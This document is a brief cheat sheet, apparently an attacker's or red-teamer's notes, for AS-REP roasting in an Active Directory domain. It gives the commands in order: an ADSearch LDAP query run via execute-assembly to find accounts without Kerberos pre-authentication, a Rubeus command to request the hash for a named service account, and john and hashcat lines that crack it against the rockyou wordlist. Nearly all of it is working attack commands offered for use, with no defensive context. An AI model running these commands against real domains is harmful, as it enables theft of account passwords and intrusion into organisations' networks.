# Get users that are as-reproastable in the Domain

```bash
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

---

# AS-REProast a specific user with Rubeus

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
```

---

# Crack hashes from as-reproasted user

```bash
 john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt squid_svc.hash
 hashcat -a 0 -m 18200 squid_svc.hash /usr/share/wordlists/rockyou.txt
```
